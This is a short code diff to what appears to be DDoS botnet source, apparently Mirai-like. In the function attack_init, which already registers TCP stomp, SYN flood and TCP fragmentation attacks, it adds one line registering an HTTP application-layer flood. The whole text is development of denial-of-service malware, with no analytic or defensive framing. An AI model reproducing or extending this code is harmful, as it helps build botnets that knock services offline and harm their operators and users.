@@ -23,6 +23,7 @@ BOOL attack_init(void)
     add_attack(ATK_VEC_STOMP, (ATTACK_FUNC)attack_method_tcpstomp);
     add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_tcp_syn);
     add_attack(ATK_VEC_TCPFRAG, (ATTACK_FUNC)attack_method_tcpfrag);
+    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
     return TRUE;
 }
 void attack_kill_all(void)
